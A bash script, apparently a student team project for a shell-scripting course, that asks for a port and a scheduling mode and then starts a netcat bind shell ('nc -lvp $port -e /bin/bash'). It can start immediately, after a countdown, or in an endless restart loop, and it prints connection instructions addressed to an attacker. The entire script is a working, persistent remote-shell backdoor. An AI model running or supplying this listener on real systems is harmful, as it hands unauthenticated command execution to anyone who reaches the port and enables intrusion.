#!/bin/bash
# ============================================================
# Project: Scheduled Listener using Netcat
# Course: COSC/ITAP 3411 - Bash Shell Scripting
# Team: Theta
# Description: This script creates a scheduled netcat listener
#              that waits for incoming connections on a specific port
# ============================================================

# Display welcome banner
echo "=========================================="
echo "   Scheduled Netcat Listener Tool"
echo "   Team Theta - COSC/ITAP 3411"
echo "=========================================="
echo ""

# ============================================================
# STEP 1: Get Port Number from User
# ============================================================
# The read command with -p switch displays a prompt and stores input
read -p "Enter the port number to listen on (e.g., 4444): " port

# ============================================================
# STEP 2: Validate Port Number
# ============================================================
# Check if port is a valid number between 1024 and 65535
# Ports below 1024 require root privileges
if [ -z "$port" ]; then
    # -z checks if variable is empty
    echo "ERROR: Port number cannot be empty!"
    exit 1
elif [ "$port" -lt 1024 ]; then
    # -lt means "less than"
    echo "WARNING: Port $port requires root privileges!"
    echo "Recommended: Use ports above 1024"
    read -p "Continue anyway? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        echo "Exiting..."
        exit 1
    fi
elif [ "$port" -gt 65535 ]; then
    # -gt means "greater than"
    echo "ERROR: Port number must be between 1 and 65535!"
    exit 1
else
    echo "✓ Port $port is valid"
fi

echo ""

# ============================================================
# STEP 3: Choose Scheduling Option
# ============================================================
echo "Select Scheduling Option:"
echo "1) Start listener immediately"
echo "2) Start listener after a delay (using sleep)"
echo "3) Start listener at repeated intervals (loop mode)"
echo ""
read -p "Enter your choice (1, 2, or 3): " choice

echo ""

# ============================================================
# STEP 4: Process User's Choice Using Conditionals
# ============================================================

if [ "$choice" -eq 1 ]; then
    # --------------------------------------------------------
    # OPTION 1: Immediate Listener
    # --------------------------------------------------------
    echo "=========================================="
    echo "Starting listener immediately on port $port"
    echo "=========================================="
    echo ""
    echo "Listener Status: ACTIVE"
    echo "Listening on: 0.0.0.0:$port"
    echo "Waiting for incoming connections..."
    echo ""
    echo "INSTRUCTIONS FOR ATTACKER:"
    echo "  Connect from another machine using:"
    echo "  nc <this_machine_ip> $port"
    echo ""
    echo "Press CTRL+C to stop the listener"
    echo ""
    
    # Start netcat listener
    # -l: listen mode
    # -v: verbose (show connection details)
    # -p: specify port number
    # -e: execute /bin/bash when connection is received
    nc -lvp "$port" -e /bin/bash

elif [ "$choice" -eq 2 ]; then
    # --------------------------------------------------------
    # OPTION 2: Delayed Start with Sleep
    # --------------------------------------------------------
    read -p "Enter delay time in seconds (e.g., 10): " delay
    
    # Validate delay input
    if [ -z "$delay" ]; then
        echo "ERROR: Delay time cannot be empty!"
        exit 1
    fi
    
    echo ""
    echo "=========================================="
    echo "Scheduling listener with $delay second delay"
    echo "=========================================="
    echo ""
    echo "Current time: $(date)"
    echo "Listener will start at: $(date -d "+$delay seconds")"
    echo ""
    echo "Status: WAITING..."
    
    # Count down before starting
    counter="$delay"
    while [ "$counter" -gt 0 ]
    do
        echo "Starting in $counter seconds..."
        sleep 1
        ((counter--))
    done
    
    echo ""
    echo "=========================================="
    echo "Listener Status: ACTIVE"
    echo "=========================================="
    echo "Listening on: 0.0.0.0:$port"
    echo "Waiting for incoming connections..."
    echo ""
    echo "INSTRUCTIONS FOR ATTACKER:"
    echo "  Connect from another machine using:"
    echo "  nc <this_machine_ip> $port"
    echo ""
    echo "Press CTRL+C to stop the listener"
    echo ""
    
    # Start netcat listener
    nc -lvp "$port" -e /bin/bash

elif [ "$choice" -eq 3 ]; then
    # --------------------------------------------------------
    # OPTION 3: Repeated Listener (Loop Mode)
    # --------------------------------------------------------
    read -p "Enter interval between restarts in seconds (e.g., 30): " interval
    
    # Validate interval input
    if [ -z "$interval" ]; then
        echo "ERROR: Interval time cannot be empty!"
        exit 1
    fi
    
    echo ""
    echo "=========================================="
    echo "Starting CONTINUOUS listener mode"
    echo "=========================================="
    echo "Port: $port"
    echo "Restart interval: $interval seconds"
    echo ""
    echo "The listener will automatically restart if connection drops"
    echo "Press CTRL+C to stop"
    echo ""
    
    # Counter to track number of times listener has started
    attempt=1
    
    # Infinite loop - will keep running until user stops it
    while true
    do
        echo "----------------------------------------"
        echo "Attempt #$attempt - $(date)"
        echo "Listener Status: ACTIVE"
        echo "Listening on: 0.0.0.0:$port"
        echo "----------------------------------------"
        
        # Start netcat listener
        # When connection closes, loop will restart automatically
        nc -lvp "$port" -e /bin/bash
        
        echo ""
        echo "Connection closed. Restarting in $interval seconds..."
        echo ""
        
        # Wait before restarting
        sleep "$interval"
        
        # Increment attempt counter
        ((attempt++))
    done

else
    # --------------------------------------------------------
    # INVALID CHOICE - Error Handling
    # --------------------------------------------------------
    echo "ERROR: Invalid choice! Please select 1, 2, or 3."
    exit 1
fi

# ============================================================
# SCRIPT END
# ============================================================
# Note: The script will terminate when:
# 1. User presses CTRL+C
# 2. An error occurs
# 3. The netcat listener is stopped
# ============================================================